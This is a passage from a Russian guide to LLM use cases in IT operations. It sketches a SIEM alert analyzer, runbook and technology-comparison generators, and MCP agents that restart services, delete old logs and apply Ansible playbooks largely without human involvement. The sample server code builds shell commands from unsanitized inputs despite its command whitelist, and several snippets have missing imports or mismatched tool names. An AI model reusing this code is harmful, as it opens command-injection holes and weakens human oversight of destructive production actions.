  - История инцидентов (экспорт из SIEM/ticketing system)
  - Whitelists/blacklists (CSV/JSON)

**Интеграция с SIEM:**
- Webhook из Wazuh/OSSIM в API LLM-системы
- Парсинг алертов (JSON)
- Обогащение данными (GeoIP, WHOIS, VirusTotal API)

**Формат данных:**
```json
{
  "alert_id": "wazuh_12345",
  "raw_alert": {...},
  "enrichment": {
    "geoip": {"country": "CN", "city": "Beijing"},
    "virustotal": {"malicious": 5, "suspicious": 2},
    "mitre_tactics": ["Credential Access"]
  },
  "rag_context": [...]
}
```

**Оценка эффекта:**
- ⏱️ Экономия времени: 30 мин анализа → 3 мин = −90% времени на triage
- 🎯 Точность классификации: 85-90% (снижение false positives на 60%)
- 📊 Улучшение SLA: MTTR для инцидентов −40%
- 🔒 Снижение рисков: быстрое реагирование на critical threats (с 1 часа до 5 минут)

**Пример реального применения:**

```python
# siem_incident_analyzer.py
from flask import Flask, request, jsonify
import requests
from qdrant_client import QdrantClient
from sentence_transformers import SentenceTransformer

app = Flask(__name__)
qdrant = QdrantClient(host="localhost", port=6333)
embedding_model = SentenceTransformer('intfloat/multilingual-e5-large')

# Webhook endpoint для SIEM
@app.route('/webhook/siem', methods=['POST'])
def analyze_alert():
    alert = request.json
    
    # 1. Обогащение данными
    enriched = enrich_alert(alert)
    
    # 2. Поиск в RAG (threat intelligence, MITRE ATT&CK)
    context = get_threat_context(enriched)
    
    # 3. Анализ LLM
    analysis = analyze_with_llm(enriched, context)
    
    # 4. Отправка в ticketing system (если critical)
    if analysis['priority'] == 'CRITICAL':
        create_ticket(analysis)
    
    return jsonify(analysis)

def enrich_alert(alert):
    # GeoIP lookup
    ip = alert['source_ip']
    geoip = requests.get(f'https://ipapi.co/{ip}/json/').json()
    
    # VirusTotal check (если есть API key)
    vt_response = requests.get(
        f'https://www.virustotal.com/api/v3/ip_addresses/{ip}',
        headers={'x-apikey': 'YOUR_VT_API_KEY'}
    ).json()
    
    return {
        **alert,
        'geoip': geoip,
        'virustotal': vt_response.get('data', {}).get('attributes', {})
    }

def get_threat_context(enriched_alert):
    # Формирование запроса для RAG
    query = f"""
    IP: {enriched_alert['source_ip']}
    Event: {enriched_alert['event']}
    Country: {enriched_alert['geoip'].get('country')}
    """
    
    query_vector = embedding_model.encode(query).tolist()
    
    # Поиск релевантных угроз
    results = qdrant.search(
        collection_name="threat_intelligence",
        query_vector=query_vector,
        limit=5
    )
    
    context = []
    for hit in results:
        context.append({
            'type': hit.payload['type'],  # mitre_attack, cve, past_incident
            'content': hit.payload['content'],
            'relevance': hit.score
        })
    
    return context

def analyze_with_llm(enriched, context):
    context_text = "\n\n".join([
        f"[{c['type']}] {c['content']}"
        for c in context
    ])
    
    prompt = f"""Ты аналитик SOC (Security Operations Center). Проанализируй инцидент ИБ.

Алерт:
{enriched['event']}
Source IP: {enriched['source_ip']}
Страна: {enriched['geoip'].get('country')}
Count: {enriched.get('count', 1)}

Контекст из базы знаний:
{context_text}

Выполни анализ:
1. Классифицируй угрозу (тип атаки, MITRE ATT&CK тактики)
2. Оцени критичность: CRITICAL/HIGH/MEDIUM/LOW
3. Определи: это реальная атака или false positive?
4. Предложи конкретные действия для реагирования

Формат ответа:
Тип угрозы: ...
MITRE ATT&CK: ...
Критичность: ...
Оценка: реальная атака / false positive
Рекомендации:
1. ...
2. ...
"""

    response = requests.post('http://llm-api:8000/v1/completions', json={
        'prompt': prompt,
        'max_tokens': 1000,
        'temperature': 0.2
    })
    
    analysis_text = response.json()['choices'][0]['text']
    
    # Парсинг приоритета
    priority = 'MEDIUM'
    if 'CRITICAL' in analysis_text:
        priority = 'CRITICAL'
    elif 'HIGH' in analysis_text:
        priority = 'HIGH'
    
    return {
        'alert_id': enriched.get('id'),
        'analysis': analysis_text,
        'priority': priority,
        'timestamp': enriched['timestamp']
    }

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

## Сценарий 10: Автоматическая генерация Runbook для типовых инцидентов

**Текущая проблема:**
При инцидентах (сервис упал, диск переполнен, сертификат истек) инженеры каждый раз заново вспоминают шаги. Runbook'и устаревают или отсутствуют. На создание уходит 1-2 часа.

**Как LLM помогает (с RAG):**
- RAG содержит историю похожих инцидентов + best practices
- LLM генерирует пошаговый runbook: диагностика → решение → проверка → документирование
- Runbook адаптируется под конкретную систему (из конфигурации в RAG)

**Примеры запросов:**
```
Запрос: "Создай runbook для инцидента: веб-сервер nginx на prod-web-01 не отвечает (502 Bad Gateway)"

RAG находит:
- Прошлые инциденты с nginx 502 (логи, решения)
- Документация инфраструктуры: prod-web-01 → backend: app-server-01:8080
- Best practices: проверка логов, перезапуск, мониторинг

LLM генерирует runbook:
---
# RUNBOOK: Nginx 502 Bad Gateway на prod-web-01

## Симптомы
- HTTP 502 Bad Gateway при обращении к https://app.company.com
- Nginx запущен, но не может достучаться до backend

## Диагностика

### Шаг 1: Проверка статуса nginx
```bash
ssh prod-web-01
systemctl status nginx
# Ожидается: active (running)
```

### Шаг 2: Проверка логов nginx
```bash
tail -f /var/log/nginx/error.log
# Ищем: "connect() failed (111: Connection refused) while connecting to upstream"
```

### Шаг 3: Проверка backend app-server
```bash
ssh app-server-01
systemctl status myapp
curl -I http://localhost:8080/health
```

## Решение

### Если backend не отвечает:
```bash
ssh app-server-01
systemctl restart myapp
# Ждем 30 секунд
systemctl status myapp
```

### Если проблема с сетью:
```bash
# Проверка firewall между nginx и backend
iptables -L -n | grep 8080
# Если порт заблокирован:
iptables -A INPUT -p tcp --dport 8080 -j ACCEPT
```

## Проверка восстановления
```bash
curl -I https://app.company.com
# Ожидается: HTTP/2 200
```

## Мониторинг
- Наблюдать за метриками в Grafana: dashboard "Nginx Performance"
- Проверить логи в течение 15 минут

## Документирование
1. Обновить тикет в системе: описание проблемы, причина, решение
2. Если это новая проблема - добавить в Knowledge Base

## Эскалация
Если проблема не решена за 15 минут:
- Уведомить tech lead: @john.doe
- Созвать war room: #incident-response
---
```

**Требуется для реализации:**

**RAG-компоненты:**
- История инцидентов (экспорт из ticketing system, логи)
- Конфигурация инфраструктуры (inventory Ansible, CMDB)
- Best practices документы (wiki, runbooks)
- Логи мониторинга (Prometheus, Grafana)

**Интеграция:**
- Ticketing API (Jira, ServiceNow) для импорта/экспорта runbook
- Ansible dynamic inventory для получения актуальной конфигурации

**Формат хранения инцидентов:**
```json
{
  "incident_id": "INC-2024-1234",
  "title": "Nginx 502 Bad Gateway",
  "symptoms": "Web app не отвечает, 502 error",
  "root_cause": "Backend app crashed из-за OOM",
  "solution": "Перезапуск app, увеличение памяти",
  "resolution_time": "15 minutes",
  "tags": ["nginx", "502", "backend"]
}
```

**Оценка эффекта:**
- ⏱️ Экономия времени: 1.5 часа создание runbook → 10 минут = −90%
- 📉 MTTR: сокращение на 30-40% благодаря готовым runbook
- 📚 База знаний: автоматическое накопление опыта (каждый инцидент → runbook)
- 🎓 Onboarding: новые инженеры решают инциденты по runbook без эскалации

**Пример реального применения:**

```python
# runbook_generator.py
import requests
from qdrant_client import QdrantClient
from sentence_transformers import SentenceTransformer

qdrant = QdrantClient(host="localhost", port=6333)
embedding_model = SentenceTransformer('intfloat/multilingual-e5-large')

def generate_runbook(incident_description, system_name):
    # 1. Поиск похожих инцидентов в RAG
    query_vector = embedding_model.encode(incident_description).tolist()
    
    similar_incidents = qdrant.search(
        collection_name="incident_history",
        query_vector=query_vector,
        limit=3
    )
    
    # 2. Получение конфигурации системы
    system_config = get_system_config(system_name)
    
    # 3. Формирование контекста
    context = format_context(similar_incidents, system_config)
    
    # 4. Генерация runbook через LLM
    prompt = f"""Создай детальный runbook для инцидента.

Инцидент: {incident_description}
Система: {system_name}

Контекст из прошлых инцидентов:
{context}

Конфигурация системы:
{system_config}

Создай runbook в формате:
# RUNBOOK: [название]
## Симптомы
## Диагностика (пошаговые команды с ожидаемым выводом)
## Решение (с конкретными командами)
## Проверка восстановления
## Мониторинг
## Документирование
## Эскалация (если не решено за X минут)

Runbook:"""

    response = requests.post('http://llm-api:8000/v1/completions', json={
        'prompt': prompt,
        'max_tokens': 2500,
        'temperature': 0.3
    })
    
    return response.json()['choices'][0]['text']

def get_system_config(system_name):
    # Получение из Ansible inventory или CMDB
    # Заглушка:
    return {
        'hostname': 'prod-web-01',
        'role': 'nginx reverse proxy',
        'backend': 'app-server-01:8080',
        'monitoring': 'grafana dashboard: nginx-performance'
    }

# Использование
incident = "Веб-сервер nginx на prod-web-01 не отвечает (502 Bad Gateway)"
runbook = generate_runbook(incident, "prod-web-01")
print(runbook)
```

---

## Сценарий 11: Сравнение технических решений с учетом контекста инфраструктуры

**Текущая проблема:**
При выборе между технологиями (PostgreSQL vs MongoDB, Kubernetes vs Docker Swarm, nginx vs HAProxy) инженеры тратят 3-5 часов на сбор информации, сравнение характеристик, оценку соответствия требованиям компании.

**Как LLM помогает (с RAG):**
- RAG содержит: требования компании, текущий стек технологий, опыт команды, ограничения (бюджет, железо)
- LLM сравнивает варианты в контексте ВАШЕЙ инфраструктуры, а не абстрактно
- Выдает матрицу решений + рекомендацию с обоснованием

**Примеры запросов:**
```
Запрос: "Что выбрать для хранилища логов: Elasticsearch или ClickHouse? Объем 500GB/день, retention 90 дней"

RAG находит:
- Текущий стек: Python, PostgreSQL, Redis
- Опыт команды: 3 инженера знают SQL, 0 знают Lucene
- Оборудование: 5 серверов по 64GB RAM, SSD
- Требования ИБ: данные должны храниться on-premise

LLM генерирует сравнение:
---
# Сравнение: Elasticsearch vs ClickHouse для хранилища логов

## Краткая рекомендация
**ClickHouse** — лучший выбор для вашей инфраструктуры

## Сравнительная таблица

| Критерий | Elasticsearch | ClickHouse | Вес |
|----------|---------------|------------|-----|
| **Производительность записи** | 100K events/sec | 500K events/sec | 🔴 |
| **Сжатие данных** | 3x | 10-20x | 🔴 |
| **Требования к RAM** | 64GB (минимум) | 32GB (достаточно) | 🟡 |
| **Язык запросов** | DSL (сложный) | SQL (знаком команде) | 🔴 |
| **Горизонтальное масштабирование** | Отличное | Хорошее | 🟢 |
| **Full-text search** | Отличный | Базовый | 🟡 |
| **Retention управление** | Ручное (ILM) | Автоматическое (TTL) | 🟢 |

## Анализ в контексте вашей инфраструктуры

### ClickHouse (рекомендуется)
✅ **Плюсы для вас:**
- Ваша команда знает SQL → нулевое время обучения
- Сжатие 10-20x → 500GB/день превратятся в 25-50GB (экономия дискового пространства)
- 32GB RAM достаточно → укладываемся в текущее железо
- TTL для retention → автоматическое удаление старых данных без скриптов

❌ **Минусы:**
- Слабый full-text search (но для логов обычно ищут по полям, а не по тексту)
- Меньше готовых интеграций (но есть Vector, Fluent Bit)

### Elasticsearch
✅ **Плюсы:**
- Мощный full-text search
- Больше ready-made решений (ELK stack)

❌ **Минусы для вас:**
- Команда не знает Lucene DSL → 2-3 месяца обучения
- Требует 64GB RAM минимум → придется расширять железо (+800K рублей)
- Сжатие только 3x → 500GB/день = 165GB/день на диске (5TB за 90 дней)
- ILM политики нужно настраивать вручную

## Рекомендация
Используйте **ClickHouse** потому что:
1. Команда сразу продуктивна (SQL)
2. Экономия на железе: ~1.5млн рублей (не нужно расширять RAM и диски)
3. Простота эксплуатации: автоматический retention, меньше moving parts

## План внедрения
1. Развернуть ClickHouse кластер (3 ноды) — 2 дня
2. Настроить Vector/Fluent Bit для отправки логов — 1 день
3. Создать таблицы с TTL 90 дней — 2 часа
4. Миграция дашбордов из Grafana — 1 день

Итого: 5 рабочих дней
---
```

**Требуется для реализации:**

**RAG-компоненты:**
- Текущий стек технологий (Ansible inventory, documentation)
- Матрица навыков команды (HR data, surveys)
- Требования ИБ и compliance (политики безопасности)
- Ограничения инфраструктуры (CPU, RAM, disk, network)
- История решений (Architecture Decision Records - ADR)

**Формат данных в RAG:**
```json
{
  "type": "infrastructure_constraint",
  "category": "hardware",
  "content": "5 серверов: AMD EPYC 7543, 64GB RAM, 2TB NVMe SSD, 10Gbit network"
},
{
  "type": "team_skill",
  "content": "Python: 5 инженеров (expert), Go: 1 инженер (intermediate), SQL: 3 инженера (expert)"
},
{
  "type": "security_requirement",
  "content": "Все данные должны храниться on-premise, шифрование at-rest обязательно"
}
```

**Оценка эффекта:**
- ⏱️ Экономия времени: 4 часа research → 15 минут = −94%
- 💰 Экономия бюджета: обоснованный выбор экономит от 500K до 5M рублей (избежание неудачных технологий)
- 📉 Снижение рисков: учет реальных ограничений (навыки, железо) → меньше failed projects (−70%)
- 🎯 Качество решений: взвешенный анализ вместо "выбираем что популярнее"

**Пример реального применения:**

```python
# tech_comparison.py
import requests
from qdrant_client import QdrantClient
from sentence_transformers import SentenceTransformer

qdrant = QdrantClient(host="localhost", port=6333)
embedding_model = SentenceTransformer('intfloat/multilingual-e5-large')

def compare_technologies(tech_a, tech_b, use_case, requirements):
    # 1. Получение контекста инфраструктуры из RAG
    context_queries = [
        f"текущий технологический стек",
        f"навыки команды {tech_a} {tech_b}",
        f"оборудование сервера ресурсы",
        f"требования безопасности"
    ]
    
    infrastructure_context = []
    for query in context_queries:
        query_vector = embedding_model.encode(query).tolist()
        results = qdrant.search(
            collection_name="infrastructure_docs",
            query_vector=query_vector,
            limit=2
        )
        infrastructure_context.extend([hit.payload['content'] for hit in results])
    
    context_text = "\n".join(infrastructure_context)
    
    # 2. Генерация сравнения
    prompt = f"""Ты архитектор IT-систем. Сравни две технологии для конкретного use case с учетом реальной инфраструктуры компании.

Use case: {use_case}
Технология A: {tech_a}
Технология B: {tech_b}

Требования: {requirements}

Контекст инфраструктуры компании:
{context_text}

Создай сравнение в формате:
1. **Краткая рекомендация** (какую выбрать и почему одной фразой)
2. **Сравнительная таблица** (критерии, оценки, вес критерия)
3. **Анализ в контексте вашей инфраструктуры**:
   - Плюсы/минусы технологии A ДЛЯ ВАС
   - Плюсы/минусы технологии B ДЛЯ ВАС
4. **Обоснование рекомендации** (3-5 главных причин)
5. **Оценка TCO** (если возможно)
6. **План внедрения** (шаги и сроки)

Сравнение:"""

    response = requests.post('http://llm-api:8000/v1/completions', json={
        'prompt': prompt,
        'max_tokens': 2500,
        'temperature': 0.4
    })
    
    return response.json()['choices'][0]['text']

# Пример использования
comparison = compare_technologies(
    tech_a="Elasticsearch",
    tech_b="ClickHouse",
    use_case="Хранилище логов приложений и систем",
    requirements="500GB/день, retention 90 дней, полнотекстовый поиск желателен"
)

print(comparison)

# Сохранение в Architecture Decision Record
with open(f"ADR-{datetime.now().strftime('%Y%m%d')}-log-storage.md", 'w') as f:
    f.write(f"# ADR: Выбор хранилища логов\n\n")
    f.write(f"Дата: {datetime.now()}\n\n")
    f.write(comparison)
```

---

### 🔵 Блок 3: С MCP (высокая сложность внедрения)

---

## Сценарий 12: Автоматическое реагирование на инциденты мониторинга через MCP

**Текущая проблема:**
Alertmanager (Prometheus) отправляет алерты (CPU high, disk full, service down). Инженер получает уведомление в 3 AM, логинится, выполняет стандартные действия (перезапуск, очистка, масштабирование). Занимает 15-30 минут, нарушается сон.

**Как LLM помогает (с MCP):**
- MCP сервер предоставляет инструменты: restart_service, clear_disk, scale_deployment, check_logs
- LLM получает алерт → анализирует → выполняет действия через MCP → документирует
- Автоматизация 60-80% типовых инцидентов без участия человека

**Примеры запросов:**

```
Алерт из Prometheus Alertmanager:
{
  "alert": "DiskSpaceHigh",
  "instance": "app-server-02",
  "value": "92%",
  "severity": "warning"
}

LLM анализирует + действует через MCP:

1. [MCP: check_disk_usage]
   → /var/log занимает 45GB (старые логи приложения)

2. [Решение LLM]
   → Безопасно удалить логи старше 30 дней

3. [MCP: execute_command]
   → find /var/log/myapp -name "*.log" -mtime +30 -delete

4. [MCP: check_disk_usage]
   → Диск освобожден: 67% использовано

5. [MCP: send_notification]
   → Slack #ops: "✓ Автоматически решен инцидент DiskSpaceHigh на app-server-02. Удалено 25GB старых логов. Диск: 92% → 67%"

6. [MCP: create_ticket]
   → Создан тикет OPS-5678 с описанием действий
```

**Требуется для реализации:**

**MCP серверы (инструменты):**

1. **Infrastructure MCP** — управление инфраструктурой
   ```python
   # Tools:
   - restart_service(host, service_name)
   - stop_service(host, service_name)
   - check_service_status(host, service_name)
   - execute_command(host, command, safe_mode=True)
   - check_disk_usage(host, path)
   - check_logs(host, service, lines=100)
   ```

2. **Kubernetes MCP** — для кластеров K8s
   ```python
   # Tools:
   - scale_deployment(namespace, deployment, replicas)
   - restart_pod(namespace, pod_name)
   - get_pod_logs(namespace, pod_name, lines)
   - describe_pod(namespace, pod_name)
   ```

3. **Notification MCP** — уведомления
   ```python
   # Tools:
   - send_slack(channel, message)
   - send_email(to, subject, body)
   - create_pagerduty_incident(title, description)
   ```

4. **Ticketing MCP** — документирование
   ```python
   # Tools:
   - create_ticket(title, description, priority)
   - update_ticket(ticket_id, comment)
   - close_ticket(ticket_id, resolution)
   ```

**Архитектура с MCP:**
```
┌─────────────────┐
│ Prometheus/     │
│ Alertmanager    │
└────────┬────────┘
         │ webhook
         ▼
┌─────────────────┐
│ LLM Orchestrator│ ← Анализ алерта
│ (Python app)    │   Выбор действий
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ LLM (GigaChat)  │ ← Reasoning + tool selection
└────────┬────────┘
         │
         ▼
┌─────────────────────────────────────────┐
│          MCP Server Manager             │
├─────────────┬──────────────┬────────────┤
│ Infra MCP   │ K8s MCP      │ Notif MCP  │
│ (Ansible)   │ (kubectl)    │ (Slack API)│
└─────────────┴──────────────┴────────────┘
         │
         ▼
┌─────────────────┐
│ Infrastructure  │
└─────────────────┘
```

**Безопасность MCP:**
- Whitelist разрешенных команд (только read-only + safe operations)
- Dry-run mode для критических действий (предпросмотр перед выполнением)
- Approval workflow для деструктивных операций (требуется подтверждение инженера)
- Полное журналирование всех MCP вызовов с user/timestamp/command

**Формат MCP tool definition:**
```json
{
  "name": "restart_service",
  "description": "Перезапускает systemd сервис на указанном хосте",
  "parameters": {
    "host": {"type": "string", "description": "Hostname или IP"},
    "service_name": {"type": "string", "description": "Имя systemd сервиса"}
  },
  "safety_level": "medium",
  "requires_approval": false
}
```

**Оценка эффекта:**
- ⏱️ Экономия времени: 25 мин ручной работы → 2 мин автоматически = −92%
- 🌙 Улучшение work-life balance: −80% ночных вызовов инженеров
- 📊 Улучшение SLA: MTTR с 20 минут до 3 минут (−85%)
- 🤖 Автоматизация: 60-80% типовых инцидентов решаются без человека

**Пример реального применения:**

```python
# incident_responder.py
from flask import Flask, request
import requests
import json

app = Flask(__name__)
LLM_API = "http://llm-api:8000/v1/messages"
MCP_TOOLS = load_mcp_tools()  # Загрузка определений MCP tools

@app.route('/webhook/alertmanager', methods=['POST'])
def handle_alert():
    alerts = request.json['alerts']
    
    for alert in alerts:
        if alert['status'] == 'firing':
            response = respond_to_incident(alert)
            log_incident(alert, response)
    
    return '', 200

def respond_to_incident(alert):
    # 1. Формирование запроса к LLM с MCP tools
    messages = [
        {
            "role": "user",
            "content": f"""Ты система автоматического реагирования на инциденты.

Получен алерт:
- Alert: {alert['labels']['alertname']}
- Instance: {alert['labels']['instance']}
- Severity: {alert['labels']['severity']}
- Description: {alert['annotations']['description']}
- Value: {alert['annotations'].get('value', 'N/A')}

Проанализируй инцидент и выполни необходимые действия:
1. Диагностика (используй check_* tools)
2. Решение проблемы (если это типовой инцидент)
3. Уведомление команды
4. Создание тикета с описанием действий

Если проблема критическая или нетиповая - создай инцидент в PagerDuty для эскалации.

Действуй."""
        }
    ]
    
    # 2. Отправка запроса к LLM с включенными MCP tools
    llm_response = requests.post(LLM_API, json={
        "model": "gigachat-latest",
        "messages": messages,
        "tools": MCP_TOOLS,  # Список доступных MCP инструментов
        "max_tokens": 2000
    })
    
    response_data = llm_response.json()
    
    # 3. Обработка ответа LLM (tool calls)
    result = {"actions": [], "summary": ""}
    
    for content_block in response_data['content']:
        if content_block['type'] == 'tool_use':
            # LLM решил использовать MCP tool
            tool_result = execute_mcp_tool(
                content_block['name'],
                content_block['input']
            )
            result['actions'].append({
                'tool': content_block['name'],
                'input': content_block['input'],
                'result': tool_result
            })
        
        elif content_block['type'] == 'text':
            result['summary'] = content_block['text']
    
    return result

def execute_mcp_tool(tool_name, parameters):
    """Выполнение MCP tool через соответствующий MCP сервер"""
    
    # Маршрутизация на нужный MCP сервер
    if tool_name.startswith('k8s_'):
        mcp_server = "http://k8s-mcp:8001"
    elif tool_name.startswith('infra_'):
        mcp_server = "http://infra-mcp:8002"
    elif tool_name.startswith('notify_'):
        mcp_server = "http://notify-mcp:8003"
    else:
        raise ValueError(f"Unknown tool: {tool_name}")
    
    # Вызов MCP сервера
    response = requests.post(f"{mcp_server}/execute", json={
        'tool': tool_name,
        'parameters': parameters
    })
    
    return response.json()

def log_incident(alert, response):
    """Журналирование инцидента и действий"""
    incident_log = {
        'timestamp': alert['startsAt'],
        'alert': alert['labels']['alertname'],
        'instance': alert['labels']['instance'],
        'actions_taken': response['actions'],
        'summary': response['summary']
    }
    
    # Сохранение в БД/Elasticsearch
    save_to_audit_log(incident_log)
    
    # Отправка в Slack
    notify_slack(f"🤖 Автоматически обработан инцидент {alert['labels']['alertname']}\n{response['summary']}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
```

**Пример MCP сервера (Infrastructure):**

```python
# infra_mcp_server.py
from flask import Flask, request, jsonify
import subprocess
import paramiko

app = Flask(__name__)

# Whitelist безопасных команд
SAFE_COMMANDS = {
    'check_disk': 'df -h',
    'check_memory': 'free -h',
    'check_service': 'systemctl status {service}',
    'list_large_files': 'du -sh /var/log/* | sort -rh | head -10'
}

SAFE_OPERATIONS = [
    'restart_service',
    'check_disk_usage',
    'check_logs',
    'clean_old_logs'
]

@app.route('/execute', methods=['POST'])
def execute_tool():
    data = request.json
    tool_name = data['tool']
    params = data['parameters']
    
    # Проверка безопасности
    if tool_name not in SAFE_OPERATIONS:
        return jsonify({'error': 'Tool not whitelisted'}), 403
    
    # Выполнение tool
    if tool_name == 'check_disk_usage':
        result = check_disk_usage(params['host'], params.get('path', '/'))
    
    elif tool_name == 'restart_service':
        result = restart_service(params['host'], params['service_name'])
    
    elif tool_name == 'clean_old_logs':
        result = clean_old_logs(params['host'], params['path'], params['days'])
    
    else:
        result = {'error': 'Tool not implemented'}
    
    # Журналирование
    log_mcp_call(tool_name, params, result)
    
    return jsonify(result)

def check_disk_usage(host, path):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, username='automation', key_filename='/root/.ssh/id_rsa')
    
    stdin, stdout, stderr = ssh.exec_command(f'df -h {path}')
    output = stdout.read().decode()
    
    # Парсинг вывода
    lines = output.strip().split('\n')
    if len(lines) > 1:
        usage_line = lines[1].split()
        return {
            'path': path,
            'size': usage_line[1],
            'used': usage_line[2],
            'available': usage_line[3],
            'use_percent': usage_line[4],
            'status': 'ok'
        }
    
    return {'error': 'Failed to parse df output'}

def restart_service(host, service_name):
    # Использование Ansible для безопасного перезапуска
    playbook = f"""
---
- hosts: {host}
  tasks:
    - name: Restart service
      systemd:
        name: {service_name}
        state: restarted
    """
    
    result = subprocess.run(
        ['ansible-playbook', '-'],
        input=playbook.encode(),
        capture_output=True
    )
    
    if result.returncode == 0:
        return {'status': 'success', 'message': f'Service {service_name} restarted'}
    else:
        return {'status': 'error', 'message': result.stderr.decode()}

def clean_old_logs(host, path, days):
    # Dry-run сначала
    command = f"find {path} -name '*.log' -mtime +{days}"
    
    ssh = paramiko.SSHClient()
    ssh.connect(host, username='automation', key_filename='/root/.ssh/id_rsa')
    
    stdin, stdout, stderr = ssh.exec_command(command)
    files_to_delete = stdout.read().decode().strip().split('\n')
    
    if not files_to_delete or files_to_delete == ['']:
        return {'status': 'success', 'message': 'No files to delete', 'deleted_count': 0}
    
    # Реальное удаление
    delete_command = f"find {path} -name '*.log' -mtime +{days} -delete"
    stdin, stdout, stderr = ssh.exec_command(delete_command)
    
    return {
        'status': 'success',
        'message': f'Deleted {len(files_to_delete)} log files',
        'deleted_count': len(files_to_delete),
        'freed_space': '~X GB'  # Можно вычислить точно
    }

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8002)
```

---

## Сценарий 13: Автоматическое создание и применение Ansible playbooks через MCP

**Текущая проблема:**
Получена задача: "Установи PostgreSQL 15 на 5 новых серверов, настрой репликацию, добавь в мониторинг". Инженер пишет playbook 2-3 часа, тестирует, применяет. Если ошибка — правит и перезапускает.

**Как LLM помогает (с MCP):**
- LLM генерирует Ansible playbook из текстового описания
- MCP инструменты: validate_playbook, run_playbook_check, apply_playbook, rollback
- LLM применяет playbook, анализирует ошибки, автоматически исправляет и переприменяет

**Примеры запросов:**

```
Задача: "Установи PostgreSQL 15 на серверы db-[01-05], настрой master-slave репликацию (db-01 = master), добавь в Prometheus node_exporter"

Workflow LLM + MCP:

1. [LLM генерирует playbook]
   → 150 строк YAML (install, configure replication, setup monitoring)

2. [MCP: validate_playbook]
   → ansible-playbook --syntax-check
   → Результат: ✓ Синтаксис корректен

3. [MCP: run_playbook_check]
   → ansible-playbook --check (dry-run)
   → Результат: Warning - переменная replication_password не установлена

4. [LLM исправляет]
   → Добавляет запрос пароля через ansible-vault

5. [MCP: apply_playbook]
   → ansible-playbook -i inventory playbook.yml
   → Выполнение... 

6. [Ошибка на db-03]
   → TASK [Install PostgreSQL] failed: Package not found

7. [LLM анализирует]
   → db-03 использует другой дистрибутив (CentOS вместо Ubuntu)
   → Исправляет playbook (добавляет when: ansible_os_family == "Debian")

8. [MCP: apply_playbook]
   → Retry на db-03
   → Результат: ✓ Все 5 серверов настроены успешно

9. [MCP: run_tests]
   → Проверка репликации: psql -c "SELECT * FROM pg_stat_replication"
   → Проверка мониторинга: curl http://db-01:9100/metrics
   → Результат: ✓ Все тесты пройдены

10. [MCP: create_documentation]
    → Создан тикет с описанием установки
    → Обновлена inventory documentation
```

**Требуется для реализации:**

**MCP серверы:**

1. **Ansible MCP**
   ```python
   Tools:
   - generate_playbook(description, hosts, requirements)
   - validate_playbook(playbook_content)
   - run_playbook_check(playbook_path, inventory)  # dry-run
   - apply_playbook(playbook_path, inventory, tags=None)
   - rollback_playbook(playbook_path, inventory)
   - get_playbook_facts(hosts)
   ```

2. **Testing MCP**
   ```python
   Tools:
   - run_serverspec_tests(host, test_suite)
   - check_service_health(host, service)
   - verify_connectivity(source, destination, port)
   ```

3. **Documentation MCP**
   ```python
   Tools:
   - update_inventory_doc(hosts, role, description)
   - create_runbook(title, steps)
   - update_cmdb(hosts, attributes)
   ```

**Архитектура:**
```
┌──────────────┐
│    User      │ "Установи PostgreSQL на 5 серверов"
└──────┬───────┘
       │
       ▼
┌──────────────┐
│     LLM      │ Генерирует playbook
└──────┬───────┘
       │
       ▼
┌──────────────────────────────┐
│      Ansible MCP             │
├──────────────┬───────────────┤
│  validate    │  apply        │
│  check       │  rollback     │
└──────────────┴───────────────┘
       │
       ▼
┌──────────────┐
│  Ansible     │ Применяет к серверам
│  Engine      │
└──────────────┘
       │
       ▼
┌──────────────────────────────┐
│  db-01  db-02  db-03  ...    │
└──────────────────────────────┘
```

**Безопасность:**
- Approval для production (требуется подтверждение engineer)
- Automatic rollback при критических ошибках
- Snapshot перед изменениями (если поддерживается)
- Phased rollout: сначала 1 сервер (canary), потом остальные

**Оценка эффекта:**
- ⏱️ Экономия времени: 3 часа → 20 минут = −89%
- 📉 Снижение ошибок: автоматическая валидация, dry-run, исправление ошибок (−70% проблем при деплое)
- 🔄 Ускорение итераций: исправление ошибки 30 мин → 3 мин
- 📚 Автоматическая документация: playbook + runbook создаются одновременно

**Пример реального применения:**

```python
# ansible_automation.py
import requests
import time

LLM_API = "http://llm-api:8000/v1/messages"

def automate_ansible_task(task_description, target_hosts):
    messages = [
        {
            "role": "user",
            "content": f"""Ты DevOps-инженер. Выполни задачу автоматизации с помощью Ansible.

Задача: {task_description}
Целевые хосты: {target_hosts}

Твой workflow:
1. Сгенерируй Ansible playbook (используй generate_playbook)
2. Провалидируй синтаксис (validate_playbook)
3. Выполни dry-run (run_playbook_check)
4. Если есть ошибки/warnings - исправь playbook
5. Примени playbook (apply_playbook)
6. Если есть ошибки выполнения - проанализируй, исправь, переприменяй
7. Выполни smoke tests (check_service_health)
8. Создай документацию (update_inventory_doc)

Начинай выполнение."""
        }
    ]
    
    # Итеративное выполнение с MCP
    max_iterations = 10
    for iteration in range(max_iterations):
        response = requests.post(LLM_API, json={
            "model": "gigachat-latest",
            "messages": messages,
            "tools": load_ansible_mcp_tools(),
            "max_tokens": 2000
        })
        
        response_data = response.json()
        
        # Обработка tool calls
        tool_results = []
        for content_block in response_data['content']:
            if content_block['type'] == 'tool_use':
                print(f"[Iteration {iteration+1}] Executing: {content_block['name']}")
                
                tool_result = execute_ansible_mcp(
                    content_block['name'],
                    content_block['input']
                )
                
                tool_results.append({
                    "type": "tool_result",
                    "tool_use_id": content_block['id'],
                    "content": json.dumps(tool_result)
                })
                
                print(f"  Result: {tool_result.get('status', 'unknown')}")
            
            elif content_block['type'] == 'text':
                print(f"[LLM] {content_block['text']}")
        
        # Если нет tool calls - задача завершена
        if not tool_results:
            print("\n✓ Задача выполнена успешно!")
            break
        
        # Добавление результатов tool calls в историю
        messages.append({"role": "assistant", "content": response_data['content']})
        messages.append({"role": "user", "content": tool_results})
        
        time.sleep(1)  # Rate limiting

# Запуск
automate_ansible_task(
    task_description="Установи PostgreSQL 15 на серверы, настрой master-slave репликацию, добавь мониторинг",
    target_hosts="db-01,db-02,db-03,db-04,db-05"
)
```

---

## Сценарий 14: Интеллектуальный анализ сетевого трафика и автоматическое создание firewall rules

**Текущая проблема:**
Приложение не работает — "connection refused". Инженеры 20-40 минут выясняют: какой порт нужен, между какими хостами, проверяют firewall rules, добавляют правило, тестируют.

**Как LLM помогает (с MCP + RAG):**
